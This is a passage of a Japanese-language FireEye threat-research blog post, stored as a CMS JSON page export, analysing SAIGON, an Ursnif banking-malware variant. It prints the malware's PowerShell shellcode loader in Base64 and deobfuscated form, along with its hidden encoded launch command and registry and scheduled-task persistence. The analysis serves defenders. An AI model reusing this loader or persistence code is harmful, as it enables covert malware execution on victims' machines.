{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "fireeye_global_admin",
  "jcr:created": "Fri Jan 24 2020 08:53:37 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "fireeye_global_admin",
    "jcr:title": "SAIGON\uff1aUrsnif\u306e\u5947\u5999\u306a\u30d6\u30e9\u30f3\u30c1",
    "twitterSize": "small",
    "jcr:versionHistory": "78f2631a-4ebb-4ab0-acd7-abd87a651f02",
    "author": "Sandor Nemes",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "ja",
    "jcr:predecessors": [
      "a8afe480-75ca-4803-9864-dcabc9faed93"
    ],
    "jcr:created": "Fri Jan 24 2020 08:53:37 GMT+0000",
    "cq:lastModified": "Fri Jan 24 2020 08:52:46 GMT+0000",
    "jcr:baseVersion": "a8afe480-75ca-4803-9864-dcabc9faed93",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:sandor-nemes",
      "fireeye-blog-authors:zander-work",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:cybercrime",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:malware",
      "fireeye-blog-tags:financial-industry"
    ],
    "jcr:uuid": "f1ed5aaf-fe34-4c20-855e-8e1da9620d13",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Fri Jan 10 2020 02:30:00 GMT+0900",
    "cq:lastModifiedBy": "asami.wakasugi@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "asami.wakasugi@fireeye.com",
        "text": "\u003Cp\u003EUrsnif\uff08\u5225\u540dGozi\/Gozi-ISFB\uff09\u306f\u3001\u73fe\u5728\u3082\u76db\u3093\u306b\u914d\u5e03\u3055\u308c\u3066\u3044\u308b\u3001\u53e4\u3044\u30d0\u30f3\u30ad\u30f3\u30b0\u30fb\u30de\u30eb\u30a6\u30a7\u30a2\u30fb\u30d5\u30a1\u30df\u30ea\u30fc\u306e1\u3064\u3067\u3059\u3002Ursnif\u306e\u6700\u521d\u306e\u30e1\u30b8\u30e3\u30fc\u30d0\u30fc\u30b8\u30e7\u30f3\u306f2006\u5e74\u306b\u78ba\u8a8d\u3055\u308c\u3001\u30bd\u30fc\u30b9\u30b3\u30fc\u30c9\u304c\u6d41\u51fa\u3057\u305f\u305f\u3081\u3001\u3044\u304f\u3064\u304b\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u304c\u5f8c\u7d9a\u3057\u3066\u30ea\u30ea\u30fc\u30b9\u3055\u308c\u3066\u3044\u307e\u3059\u3002FireEye\u306f\u3001\u8907\u6570\u306ePOS\u30de\u30eb\u30a6\u30a7\u30a2\u30fb\u30d5\u30a1\u30df\u30ea\u30fc\u3092\u542b\u3080\u30c4\u30fc\u30eb\u3092\u96c6\u3081\u305f\u30db\u30b9\u30c8\u30fb\u30b5\u30fc\u30d0\u30fc\u3092\u7279\u5b9a\u3057\u305f\u5f8c\u30012019\u5e749\u6708\u306b\u3001\u003Ca href=\u0022https:\/\/www.fireeye.jp\/solutions\/cyber-threat-intelligence\/threat-intelligence-subscriptions.html\u0022 adhocenable=\u0022false\u0022\u003EThreat Intelligence\u30b5\u30d6\u30b9\u30af\u30ea\u30d7\u30b7\u30e7\u30f3\u5951\u7d04\u8005\u003C\/a\u003E\u306b\u3001\u4ee5\u524d\u306f\u78ba\u8a8d\u3055\u308c\u3066\u3044\u306a\u3044Ursnif\u30de\u30eb\u30a6\u30a7\u30a2\u30fb\u30d5\u30a1\u30df\u30ea\u30fc\u306e\u4e9c\u7a2e\u306b\u3064\u3044\u3066\u5831\u544a\u3057\u307e\u3057\u305f\u3002\u3053\u306e\u30de\u30eb\u30a6\u30a7\u30a2\u306f\u300cSaiGon version 3.50 rev 132\u300d\u3068\u81ea\u5df1\u540c\u4e00\u6027\u304c\u3042\u308a\u3001\u89e3\u6790\u306e\u7d50\u679c\u3001Ursnif\u306e\u4e9c\u7a2ev3\uff08RM3\uff09\u306e\u30bd\u30fc\u30b9\u30b3\u30fc\u30c9\u3092\u30d9\u30fc\u30b9\u306b\u3057\u3066\u3044\u308b\u53ef\u80fd\u6027\u304c\u9ad8\u305d\u3046\u3067\u3059\u3002\u7279\u306b\u3001SAIGON\u306e\u6a5f\u80fd\u306f\u3001\u672c\u683c\u7684\u306a\u30d0\u30f3\u30ad\u30f3\u30b0\u30fb\u30de\u30eb\u30a6\u30a7\u30a2\u3068\u3044\u3046\u3088\u308a\u6c4e\u7528\u7684\u306a\u30d0\u30c3\u30af\u30c9\u30a2\u3067\u3042\u308a\u3001\u304a\u305d\u3089\u304f\u3001\u6a19\u7684\u578b\u30b5\u30a4\u30d0\u30fc\u72af\u7f6a\u653b\u6483\u306b\u4f7f\u7528\u3059\u308b\u3088\u3046\u8abf\u6574\u3055\u308c\u3066\u3044\u308b\u3088\u3046\u3067\u3059\u3002\u003C\/p\u003E\n\u003Ch4\u003E\u6280\u8853\u5206\u6790\u003Cbr\u003E\n\u003C\/h4\u003E\n\u003Ch5\u003E\u632f\u308b\u821e\u3044\u003Cbr\u003E\n\u003C\/h5\u003E\n\u003Cp\u003ESAIGON\u306f\u3001Base64\u30a8\u30f3\u30b3\u30fc\u30c9\u3055\u308c\u305f\u30b7\u30a7\u30eb\u30b3\u30fc\u30c9\u3068\u3057\u3066\u30ec\u30b8\u30b9\u30c8\u30ea\u30fb\u30ad\u30fc\u306b\u4fdd\u5b58\u3055\u308c\u3001\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u3055\u308c\u305f\u30bf\u30b9\u30af\u3067PowerShell\u3092\u4f7f\u7528\u3057\u3066\u8d77\u52d5\u3055\u308c\u307e\u3059\u3002\u4ed6\u306eUrsnif\u4e9c\u7a2e\u3068\u540c\u69d8\u306b\u3001\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u4e3b\u306a\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u306fDLL\u30d5\u30a1\u30a4\u30eb\u3067\u3059\u3002\u3053\u306eDLL\u306b\u306f\u5358\u4e00\u306e\u30a8\u30af\u30b9\u30dd\u30fc\u30c8\u3055\u308c\u305f\u95a2\u6570\u3001\u003Ci\u003EDllRegisterServer\u003C\/i\u003E\uff08\u4f7f\u7528\u3055\u308c\u306a\u3044\u7a7a\u306e\u95a2\u6570\uff09\u3092\u6301\u3063\u3066\u3044\u307e\u3059\u3002\u30a8\u30f3\u30c8\u30ea\u30fc\u30dd\u30a4\u30f3\u30c8\u3067DLL\u304c\u30ed\u30fc\u30c9\u3055\u308c\u3066\u521d\u671f\u5316\u3055\u308c\u305f\u3068\u304d\u306b\u3001\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u3059\u3079\u3066\u306e\u95a2\u9023\u6a5f\u80fd\u304c\u5b9f\u884c\u3055\u308c\u307e\u3059\u3002\u003C\/p\u003E\n\u003Cp\u003E\u6700\u521d\u306e\u5b9f\u884c\u6642\u306b\u3001\u30de\u30eb\u30a6\u30a7\u30a2\u306f\u4f5c\u6210\u6642\u306e\u30bf\u30a4\u30e0\u30b9\u30bf\u30f3\u30d7\u3001\u003Ci\u003E%SystemDrive%\\pagefile.sys\u003C\/i\u003E\u307e\u305f\u306f\u003Ci\u003E%SystemDrive%\\hiberfil.sys\u003C\/i\u003E\u306e\u3069\u3061\u3089\u304b\u6700\u521d\u306b\u8b58\u5225\u3055\u308c\u305f\u65b9\u3092\u4f7f\u7528\u3057\u3066\u3001\u30de\u30b7\u30f3ID\u3092\u751f\u6210\u3057\u307e\u3059\u3002\u8208\u5473\u6df1\u3044\u3053\u3068\u306b\u3001\u30b7\u30b9\u30c6\u30e0\u30fb\u30c9\u30e9\u30a4\u30d6\u306f\uff08\u003Ci\u003ESharedUserData\u003C\/i\u003E\u2192\u003Ci\u003ENtSystemRoot\u003C\/i\u003E\u3092\u4ecb\u3057\u3066\uff09\u003Ci\u003EKUSER_SHARED_DATA\u003C\/i\u003E\u69cb\u9020\u4f53\u304b\u3089\u76f4\u63a5\u3001\u4e00\u822c\u7684\u3067\u306f\u306a\u3044\u65b9\u6cd5\u3067\u7167\u4f1a\u3055\u308c\u307e\u3059\u3002KUSER_SHARED_DATA\u306f\u3001\u30ab\u30fc\u30cd\u30eb\u30fb\u30e1\u30e2\u30ea\u306e\u7279\u6b8a\u306a\u90e8\u5206\u306b\u914d\u7f6e\u3055\u308c\u308b\u69cb\u9020\u4f53\u3067\u3001\u3059\u3079\u3066\u306e\u30e6\u30fc\u30b6\u30fc\u30e2\u30fc\u30c9\u30fb\u30d7\u30ed\u30bb\u30b9\u306e\u30e1\u30e2\u30ea\u7a7a\u9593\uff08\u3057\u305f\u304c\u3063\u3066\u5171\u6709\uff09\u306b\u30de\u30c3\u30d4\u30f3\u30b0\u3055\u308c\u3001\u5e38\u306b\u56fa\u5b9a\u30e1\u30e2\u30ea\u30fb\u30a2\u30c9\u30ec\u30b9\uff08SharedUserData\u30b7\u30f3\u30dc\u30eb\u304c\u6307\u3059\u003Ci\u003E0x7ffe0000\u003C\/i\u003E\uff09\u306b\u914d\u7f6e\u3055\u308c\u307e\u3059\u3002\u003C\/p\u003E\n\u003Cp\u003E\u30b3\u30fc\u30c9\u306f\u6b21\u306b\u3001\u003Ci\u003EGetWindowThreadProcessId(GetShellWindow(), ...)\u003C\/i\u003E\u3092\u547c\u3073\u51fa\u3059\u3053\u3068\u3067\u3001\u73fe\u5728\u306e\u30b7\u30a7\u30eb\u30fb\u30d7\u30ed\u30bb\u30b9\u3092\u63a2\u3057\u307e\u3059\u3002\u30b3\u30fc\u30c9\u306f\u307e\u305f\u3001\u7279\u5225\u306a\u30c1\u30a7\u30c3\u30af\u306e\u6a5f\u80fd\u3082\u6301\u3063\u3066\u3044\u307e\u3059\u3002\u30b7\u30a7\u30eb\u306e\u89aa\u30d7\u30ed\u30bb\u30b9\u306e\u540d\u524d\u304b\u3089\u8a08\u7b97\u3055\u308c\u305f\u30c1\u30a7\u30c3\u30af\u30b5\u30e0\u304c\u003Ci\u003Eexplorer.exe\u003C\/i\u003E\u306e\u30c1\u30a7\u30c3\u30af\u30b5\u30e0\uff08\u003Ci\u003E0xc3c07cf0\u003C\/i\u003E\uff09\u3068\u4e00\u81f4\u3059\u308b\u5834\u5408\u3001\u4ee3\u308f\u308a\u306b\u89aa\u30d7\u30ed\u30bb\u30b9\u306b\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3092\u8a66\u307f\u307e\u3059\u3002\u003C\/p\u003E\n\u003Cp\u003E\u6b21\u306b\u3001SAIGON\u306f\u3001\u5f93\u6765\u306e\u003Ci\u003EVirtualAllocEx \/ WriteProcessMemory \/ CreateRemoteThread\u003C\/i\u003E\u95a2\u6570\u306e\u7d44\u307f\u5408\u308f\u305b\u3092\u4f7f\u7528\u3057\u3066\u3001\u3053\u306e\u30d7\u30ed\u30bb\u30b9\u306b\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3057\u307e\u3059\u3002\u3053\u306e\u30d7\u30ed\u30bb\u30b9\u304c\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3055\u308c\u308b\u3068\u3001\u30d0\u30a4\u30ca\u30ea\u5185\u306b\u57cb\u3081\u8fbc\u307e\u308c\u305f2\u3064\u306e\u30d5\u30a1\u30a4\u30eb\u3092\u8aad\u307f\u8fbc\u307f\u307e\u3059\u3002\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ci\u003EPUBLIC.KEY\u003C\/i\u003E\u30d5\u30a1\u30a4\u30eb\uff1a\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u30b3\u30de\u30f3\u30c9\u30a2\u30f3\u30c9\u30b3\u30f3\u30c8\u30ed\u30fc\u30eb\uff08C2\uff09\u30b5\u30fc\u30d0\u30fc\u304b\u3089\u9001\u3089\u308c\u308b\u3001\u4ed6\u306e\u57cb\u3081\u8fbc\u307f\u30d5\u30a1\u30a4\u30eb\u3084\u30c7\u30fc\u30bf\u3092\u691c\u8a3c\u304a\u3088\u3073\u5fa9\u53f7\u3059\u308b\u305f\u3081\u306b\u4f7f\u7528\u3055\u308c\u308b\u003Cbr\u003E\n\u003C\/li\u003E\n\u003Cli\u003E\u003Ci\u003ERUN.PS1\u003C\/i\u003E\u30d5\u30a1\u30a4\u30eb\uff1aPowerShell\u30ed\u30fc\u30c0\u30fc\u30fb\u30b9\u30af\u30ea\u30d7\u30c8\u30fb\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\u3067\u3001\u30b9\u30af\u30ea\u30d7\u30c8\u5185\u306b\u300c\u0026quot;@SOURCE@\u0026quot;\u300d\u30d7\u30ec\u30fc\u30b9\u30db\u30eb\u30c0\u30fc\u3092\u542b\u3080\u003Cbr\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ctable cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E$hanksefksgu = [System.Convert]::FromBase64String(\u0026quot;@SOURCE@\u0026quot;);\u003Cbr\u003E\nInvoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\u0026quot;JHdneG1qZ2J4dGo9JGh\u003Cbr\u003E\nhbmtzZWZrc2d1Lkxlbmd0aDskdHNrdm89IltEbGxJbXBvcnQoYCJrZXJuZWwzMmAiKV1gbnB1YmxpYyBzdGF\u003Cbr\u003E\n0aWMgZXh0ZXJuIEludDMyIEdldEN1cnJlbnRQcm9jZXNzKCk7YG5bRGxsSW1wb3J0KGAidXNlcjMyYCIpXWB\u003Cbr\u003E\nucHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldERDKEludFB0ciBteHhhaHhvZik7YG5bRGxsSW1wb3J0K\u003Cbr\u003E\nGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlUmVtb3RlVGhyZWFkKEl\u003Cbr\u003E\nudFB0ciBoY3d5bHJicywgSW50UHRyIHdxZXIsdWludCBzZmosSW50UHRyIHdsbGV2LEludFB0ciB3d2RyaWN\u003Cbr\u003E\n0d2RrLHVpbnQga2xtaG5zayxJbnRQdHIgdmNleHN1YWx3aGgpO2BuW0RsbEltcG9ydChgImtlcm5lbDMyYCI\u003Cbr\u003E\npXWBucHVibGljIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGFqLC\u003Cbr\u003E\nBVSW50MzIga2R4c3hldik7YG5bRGxsSW1wb3J0KGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dG\u003Cbr\u003E\nVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciB4eSx1aW50IGtuYnQsdWludCB0bXJ5d2h1LHVpbnQgd2d1\u003Cbr\u003E\ndHVkKTsiOyR0c2thYXhvdHhlPUFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICR0c2t2byAtTmFtZSAnV2luMzI\u003Cbr\u003E\nnIC1uYW1lc3BhY2UgV2luMzJGdW5jdGlvbnMgLXBhc3N0aHJ1OyRtaHhrcHVsbD0kdHNrYWF4b3R4ZTo6Vml\u003Cbr\u003E\nydHVhbEFsbG9jKDAsJHdneG1qZ2J4dGosMHgzMDAwLDB4NDApO1tTeXN0ZW0uUnVudGltZS5JbnRlcm9wU\u003Cbr\u003E\n2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGhhbmtzZWZrc2d1LDAsJG1oeGtwdWxsLCR3Z3htamdieHRqKTskd\u003Cbr\u003E\nGRvY25ud2t2b3E9JHRza2FheG90eGU6OkNyZWF0ZVJlbW90ZVRocmVhZCgtMSwwLDAsJG1oeGtwdWxsLC\u003Cbr\u003E\nRtaHhrcHVsbCwwLDApOyRvY3h4am1oaXltPSR0c2thYXhvdHhlOjpXYWl0Rm9yU2luZ2xlT2JqZWN0KCR0ZG\u003Cbr\u003E\n9jbm53a3ZvcSwzMDAwMCk7\u0026quot;)));\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u30de\u30eb\u30a6\u30a7\u30a2\u306f\u3001\u3053\u306ePowerShell\u30b9\u30af\u30ea\u30d7\u30c8\u30fb\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\u306e\u300c\u003Ci\u003E\u0026quot;@SOURCE@\u0026quot;\u003C\/i\u003E\u300d\u30d7\u30ec\u30fc\u30b9\u30db\u30eb\u30c0\u30fc\u3092Base64\u30a8\u30f3\u30b3\u30fc\u30c9\u3055\u308c\u305f\u30d0\u30fc\u30b8\u30e7\u30f3\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u81ea\u4f53\u306b\u7f6e\u304d\u63db\u3048\u3001\u300c\u003Ci\u003EHKEY_CURRENT_USER\\Identities\\{\u0026lt;random_guid\u0026gt;}\u003C\/i\u003E\u300d\u30ec\u30b8\u30b9\u30c8\u30ea\u30fb\u30ad\u30fc\u306e\u4e0b\u306b\u3042\u308b\u300c\u003Ci\u003EPsRun\u003C\/i\u003E\u300d\u3068\u3044\u3046\u30ec\u30b8\u30b9\u30c8\u30ea\u5024\u306bPowerShell\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u66f8\u304d\u8fbc\u307f\u307e\u3059\uff08\u56f31\uff09\u3002\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/saigon\/Picture1.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003E\u56f31\uff1aPsRun\u306b\u66f8\u304d\u8fbc\u307e\u308c\u305fPowerShell\u30b9\u30af\u30ea\u30d7\u30c8\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u6b21\u306b\u3001SAIGON\u306e\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u306f\u3001\u300c\u003Ci\u003EPower\u0026lt;random_word\u0026gt;\u003C\/i\u003E\u300d\uff08\u003Ci\u003EPowerSgs\u003C\/i\u003E\u306a\u3069\uff09\u3068\u3044\u3046\u540d\u79f0\u306e\u65b0\u3057\u3044\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u3055\u308c\u305f\u30bf\u30b9\u30af\uff08\u56f32\uff09\u3092\u4f5c\u6210\u3057\u307e\u3059\u3002\u3053\u308c\u304c\u4f55\u3089\u304b\u306e\u7406\u7531\u3067\u5931\u6557\u3057\u305f\u5834\u5408\u3001\u300c\u003Ci\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u003C\/i\u003E\u300d\u30ec\u30b8\u30b9\u30c8\u30ea\u30fb\u30ad\u30fc\u3092\u4f7f\u7528\u3057\u3066\u3001\u30b7\u30b9\u30c6\u30e0\u306e\u518d\u8d77\u52d5\u6642\u306b\u3082\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u81ea\u8eab\u306e\u6301\u7d9a\u6027\u3092\u7dad\u6301\u3067\u304d\u308b\u3088\u3046\u306b\u3057\u307e\u3059\u3002\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/saigon\/Picture2.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003E\u56f32\uff1a\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u3055\u308c\u305f\u30bf\u30b9\u30af\u003C\/span\u003E\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Cp\u003E\u4f7f\u7528\u3059\u308b\u6301\u7d9a\u7684\u30e1\u30ab\u30cb\u30ba\u30e0\u306b\u304b\u304b\u308f\u3089\u305a\u3001\u30ec\u30b8\u30b9\u30c8\u30ea\u304b\u3089\u30d0\u30a4\u30ca\u30ea\u3092\u5b9f\u884c\u3059\u308b\u30b3\u30de\u30f3\u30c9\u306f\u6b21\u306e\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002\u003C\/p\u003E\n\u003Ctable cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPowerShell.exe -windowstyle hidden -ec aQBlAHgAIAAoAGcAcAAgACcASABLAEMAVQA6AFwASQBkAGUAbgB0AGkAdABpAGUAcwBcAHsANAAzAEIA\u003Cbr\u003E\nOQA1AEUANQBCAC0ARAAyADEAOAAtADAAQQBCADgALQA1AEQANwBGAC0AMgBDADcAOAA5AEMANQA5\u003Cbr\u003E\nAEIAMQBEAEYAfQAnACkALgBQAHMAUgB1AG4A\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u3053\u306e\u30b3\u30de\u30f3\u30c9\u304b\u3089Base64\u30a8\u30f3\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u3092\u524a\u9664\u3059\u308b\u3068\u3001\u300c\u003Ci\u003Eiex (gp \u0027HKCU:\\\\Identities\\\\{43B95E5B-D218-0AB8-5D7F-2C789C59B1DF}\u0027).PsRun\u003C\/i\u003E\u300d\u306e\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002\u3053\u306e\u30b3\u30de\u30f3\u30c9\u3092\u5b9f\u884c\u3059\u308b\u3068\u3001\u524d\u8ff0\u306e\u30ec\u30b8\u30b9\u30c8\u30ea\u5024\u306e\u5185\u5bb9\u304c\u003Ci\u003EGet-ItemProperty (gp)\u003C\/i\u003E\u3092\u4f7f\u7528\u3057\u3066\u53d6\u5f97\u3055\u308c\u3001\u003Ci\u003EInvoke-Expression (iex)\u003C\/i\u003E\u3092\u4f7f\u7528\u3057\u3066\u5b9f\u884c\u3055\u308c\u307e\u3059\u3002\u003C\/p\u003E\n\u003Cp\u003E\u6700\u5f8c\u306b\u3001\u30ec\u30b8\u30b9\u30c8\u30ea\u5185\u306ePowerShell\u30b3\u30fc\u30c9\u306f\u30e1\u30e2\u30ea\u30fb\u30d6\u30ed\u30c3\u30af\u3092\u5272\u308a\u5f53\u3066\u3001Base64\u30c7\u30b3\u30fc\u30c9\u3055\u308c\u305f\u30b7\u30a7\u30eb\u30b3\u30fc\u30c9\u3092\u305d\u3053\u306b\u30b3\u30d4\u30fc\u3057\u3001\u003Ci\u003ECreateRemoteThread\u003C\/i\u003E\u3092\u4f7f\u7528\u3057\u3066\u9818\u57df\u3092\u6307\u3059\u65b0\u3057\u3044\u30b9\u30ec\u30c3\u30c9\u3092\u8d77\u52d5\u3057\u3001\u30b9\u30ec\u30c3\u30c9\u304c\u5b8c\u4e86\u3059\u308b\u307e\u3067\u5f85\u6a5f\u3057\u307e\u3059\u3002\u4ee5\u4e0b\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u306f\u3001\u975e\u96e3\u8aad\u5316\u3057\u3066\u6574\u3048\u305fPowerShell\u3067\u3059\u3002\u003C\/p\u003E\n\u003Ctable cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E$hanksefksgu = [System.Convert]::FromBase64String(\u0026quot;@SOURCE@\u0026quot;);\u003Cbr\u003E\n$wgxmjgbxtj = $hanksefksgu.Length;\u003C\/p\u003E\n\u003Cp\u003E$tskvo = @\u0026quot;\u003Cbr\u003E\n[DllImport(\u0026quot;kernel32\u0026quot;)]\u003Cbr\u003E\npublic static extern Int32 GetCurrentProcess();\u003C\/p\u003E\n\u003Cp\u003E[DllImport(\u0026quot;user32\u0026quot;)]\u003Cbr\u003E\npublic static extern IntPtr GetDC(IntPtr mxxahxof);\u003C\/p\u003E\n\u003Cp\u003E[DllImport(\u0026quot;kernel32\u0026quot;)]\u003Cbr\u003E\npublic static extern IntPtr CreateRemoteThread(IntPtr hcwylrbs, IntPtr wqer, uint sfj, IntPtr wllev, IntPtr wwdrictwdk, uint klmhnsk, IntPtr vcexsualwhh);\u003C\/p\u003E\n\u003Cp\u003E[DllImport(\u0026quot;kernel32\u0026quot;)]\u003Cbr\u003E\npublic static extern UInt32 WaitForSingleObject(IntPtr aj, UInt32 kdxsxev);\u003C\/p\u003E\n\u003Cp\u003E[DllImport(\u0026quot;kernel32\u0026quot;)]\u003Cbr\u003E\npublic static extern IntPtr VirtualAlloc(IntPtr xy, uint knbt, uint tmrywhu, uint wgutud);\u003Cbr\u003E\n\u0026quot;@;\u003C\/p\u003E\n\u003Cp\u003E$tskaaxotxe = Add-Type -memberDefinition $tskvo -Name \u0027Win32\u0027 -namespace Win32Functions -passthru;\u003Cbr\u003E\n$mhxkpull = $tskaaxotxe::VirtualAlloc(0, $wgxmjgbxtj, 0x3000, 0x40);[System.Runtime.InteropServices.Marshal]::Copy($hanksefksgu, 0, $mhxkpull, $wgxmjgbxtj);\u003Cbr\u003E\n$tdocnnwkvoq = $tskaaxotxe::CreateRemoteThread(-1, 0, 0, $mhxkpull, $mhxkpull, 0, 0);\u003Cbr\u003E\n$ocxxjmhiym = $tskaaxotxe::WaitForSingleObject($tdocnnwkvoq, 30000);\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u30de\u30b7\u30f3\u3078\u306e\u8db3\u304c\u304b\u308a\u304c\u78ba\u7acb\u3055\u308c\u308b\u3068\u3001SAIGON\u306f\u57cb\u3081\u8fbc\u307f\u306e\u003Ci\u003ELOADER.INI\u003C\/i\u003E\u69cb\u6210\u30d5\u30a1\u30a4\u30eb\u3092\u30ed\u30fc\u30c9\u3057\u3066\u89e3\u6790\u3057\uff08\u8a73\u3057\u304f\u306f\u300c\u8a2d\u5b9a\u300d\u306e\u30bb\u30af\u30b7\u30e7\u30f3\u3092\u53c2\u7167\uff09\u3001\u30e1\u30a4\u30f3\u306e\u30ef\u30fc\u30ab\u30fc\u30fb\u30b9\u30ec\u30c3\u30c9\u3092\u8d77\u52d5\u3057\u307e\u3059\u3002\u30e1\u30a4\u30f3\u306e\u30ef\u30fc\u30ab\u30fc\u30fb\u30b9\u30ec\u30c3\u30c9\u306f\u3001C2\u30b5\u30fc\u30d0\u30fc\u306b\u5bfe\u3057\u3001\u30b3\u30de\u30f3\u30c9\u3092\u7d99\u7d9a\u7684\u306b\u30dd\u30fc\u30ea\u30f3\u30b0\u3057\u307e\u3059\u3002\u003C\/p\u003E\n\u003Ch5\u003E\u8a2d\u5b9a\u003Cbr\u003E\n\u003C\/h5\u003E\n\u003Cp\u003EUrsnif\u30bd\u30fc\u30b9\u30b3\u30fc\u30c9\u306b\u306f\u3001\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb\u306b\u30d0\u30f3\u30c9\u30eb\u3055\u308c\u305f\u5727\u7e2e\/\u6697\u53f7\u5316\u30d5\u30a1\u30a4\u30eb\u306e\u30bb\u30c3\u30c8\u3067\u3042\u308b\u3001\u300cjoined data\u300d\u3068\u547c\u3070\u308c\u308b\u6982\u5ff5\u304c\u7d44\u307f\u8fbc\u307e\u308c\u3066\u3044\u307e\u3057\u305f\u3002\u521d\u671f\u306e\u4e9c\u7a2e\u306f\u3001PE\u30d8\u30c3\u30c0\u30fc\u306e\u5f8c\u306b\u7279\u5225\u306a\u69cb\u9020\u4f53\u3092\u5229\u7528\u3057\u3001\u7279\u5b9a\u306e\u30de\u30b8\u30c3\u30af\u30fb\u30d0\u30a4\u30c8\uff08\u300c\u003Ci\u003EJF\u003C\/i\u003E\u300d\u3001\u300c\u003Ci\u003EFJ\u003C\/i\u003E\u300d\u3001\u300c\u003Ci\u003EJ1\u003C\/i\u003E\u300d\u3001\u300c\u003Ci\u003EJJ\u003C\/i\u003E\u300d\u306a\u3069Ursnif\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u306b\u3088\u3063\u3066\u7570\u306a\u308b\uff09\u306e\u30de\u30fc\u30af\u3092\u4ed8\u3051\u3066\u3044\u307e\u3057\u305f\u3002Ursnif v3\uff08\u56f33\uff09\u3067\u306f\u3001\u3053\u306e\u30c7\u30fc\u30bf\u306f\u5358\u306bPE\u30d8\u30c3\u30c0\u30fc\u306e\u5f8c\u3067\u306f\u306a\u304f\u3001PE\u30d8\u30c3\u30c0\u30fc\u306eSecurity Directory\u3067\u30dd\u30a4\u30f3\u30c8\u3055\u308c\u3001\u30de\u30b8\u30c3\u30af\u30fb\u30d0\u30a4\u30c8\u3082\u300c\u003Ci\u003EWD\u003C\/i\u003E\u300d\uff08\u003Ci\u003E0x4457\u003C\/i\u003E\uff09\u306b\u5909\u66f4\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/saigon\/Figure%203a.png\u0022 alt=\u0022\u0022\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003E\u56f33\uff1aUrsnif 